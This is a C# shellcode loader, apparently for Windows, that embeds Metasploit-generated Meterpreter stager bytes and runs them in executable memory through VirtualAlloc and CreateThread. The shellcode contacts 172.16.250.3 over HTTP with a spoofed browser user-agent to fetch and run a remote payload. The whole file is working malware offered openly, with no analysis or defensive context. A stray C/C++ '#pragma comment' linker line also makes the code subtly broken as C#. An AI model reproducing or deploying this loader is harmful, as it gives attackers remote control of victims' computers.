using System;
using System.Runtime.InteropServices;
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
namespace TCPMeterpreterProcess
{
    class Program
    {
        static void Main(string[] args)
        {
            // native function’s compiled code
            // generated with metasploit
            /* length: 797 bytes */
            byte[] shellcode = new byte[797] { 0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x84, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68, 0x50, 0x00, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x6a, 0x4e, 0x33, 0x71, 0x00, 0x6d, 0xb3, 0x4d, 0xf8, 0x32, 0x54, 0xb4, 0xc0, 0x69, 0x64, 0x53, 0x35, 0x6c, 0x0b, 0xa0, 0x4c, 0x60, 0x4f, 0xc9, 0x0c, 0x0d, 0x7e, 0x37, 0x88, 0x41, 0xdf, 0x31, 0x7a, 0x6b, 0xa2, 0x84, 0x97, 0x98, 0x78, 0x97, 0xab, 0x05, 0xc3, 0x26, 0xec, 0x81, 0x3f, 0x0c, 0x3e, 0x50, 0x3d, 0x4b, 0xd4, 0x08, 0x57, 0xbb, 0x84, 0x08, 0x7b, 0xbc, 0x42, 0x23, 0x74, 0x59, 0xec, 0xec, 0x46, 0x3f, 0xb2, 0xb6, 0xa9, 0x06, 0xe3, 0xfa, 0x74, 0xfe, 0x0d, 0xe7, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x38, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x34, 0x2e, 0x30, 0x3b, 0x20, 0x49, 0x6e, 0x66, 0x6f, 0x50, 0x61, 0x74, 0x68, 0x2e, 0x32, 0x29, 0x0d, 0x0a, 0x00, 0xcd, 0xbb, 0x27, 0x5a, 0x54, 0x62, 0x35, 0x51, 0x3d, 0x19, 0x91, 0x15, 0xb5, 0x8f, 0xc1, 0x88, 0x13, 0x04, 0xa9, 0x79, 0x3f, 0xee, 0xd7, 0xd3, 0x34, 0x91, 0x7a, 0x0d, 0xfb, 0x41, 0x6d, 0x86, 0x9b, 0xd9, 0xf7, 0x10, 0x4d, 0xa4, 0xea, 0x87, 0x5a, 0x52, 0x28, 0x49, 0x78, 0x40, 0x1b, 0x5d, 0xe6, 0x18, 0xda, 0x48, 0xfa, 0x24, 0x80, 0xdc, 0xb5, 0x08, 0x38, 0x27, 0xe6, 0x47, 0x43, 0x92, 0x41, 0xbe, 0xad, 0x35, 0xf5, 0x48, 0x42, 0x62, 0xd7, 0x4d, 0xcf, 0xa9, 0x6a, 0x76, 0x5e, 0x2d, 0x5c, 0xd4, 0x84, 0xeb, 0x04, 0x1a, 0xf9, 0x96, 0x37, 0xa1, 0x5f, 0x65, 0x84, 0x8b, 0xc1, 0xd6, 0xbc, 0xee, 0x73, 0x88, 0xab, 0xaf, 0xc1, 0x17, 0x39, 0x75, 0xc9, 0x7d, 0x93, 0xa2, 0x5d, 0xaf, 0x21, 0x39, 0xcc, 0x9c, 0x1d, 0x33, 0x37, 0x03, 0x88, 0x99, 0x44, 0xfd, 0xc7, 0x04, 0xd2, 0x81, 0xab, 0xa6, 0xa3, 0x0a, 0xe8, 0xb8, 0x08, 0x9a, 0x31, 0xf7, 0xe0, 0xf1, 0x42, 0xfc, 0x44, 0xb0, 0x47, 0xec, 0x1a, 0x98, 0x31, 0xc6, 0xeb, 0x31, 0xe7, 0x0d, 0x50, 0xc5, 0x1c, 0x74, 0x81, 0xbf, 0xbd, 0xa8, 0x27, 0x0d, 0xc0, 0x02, 0xb4, 0xb4, 0xa8, 0xcc, 0x8f, 0x8f, 0xbc, 0x7b, 0x46, 0x90, 0xcc, 0x96, 0x80, 0x35, 0xe3, 0xa4, 0x31, 0xa5, 0xe7, 0xb7, 0xce, 0x8e, 0x81, 0x52, 0x64, 0x77, 0xe3, 0xf2, 0x15, 0x91, 0x25, 0xf0, 0x5c, 0x01, 0x21, 0x71, 0x7d, 0x43, 0x5b, 0x60, 0xd3, 0x02, 0x0e, 0x37, 0x9b, 0xc3, 0x9e, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff, 0x31, 0x37, 0x32, 0x2e, 0x31, 0x36, 0x2e, 0x32, 0x35, 0x30, 0x2e, 0x33, 0x00, 0x12, 0x34, 0x56, 0x78 };
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId
        );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
        );
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(
        string moduleName
        );
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(
        IntPtr hModule,
        string procName
        );
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(
        string lpFileName
        );
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
    }
}